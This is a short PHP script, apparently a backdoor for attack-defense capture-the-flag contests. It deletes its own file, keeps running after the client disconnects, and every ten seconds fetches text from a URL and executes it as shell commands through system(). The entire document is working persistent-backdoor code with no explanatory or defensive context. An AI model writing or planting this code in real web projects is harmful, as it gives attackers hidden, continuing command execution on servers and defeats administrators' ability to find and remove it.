<?php
#光回传flag
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (true) {
    $str = file_get_contents('http://localhost/429/index.php');
    system($str);
    sleep(10);
}
?>

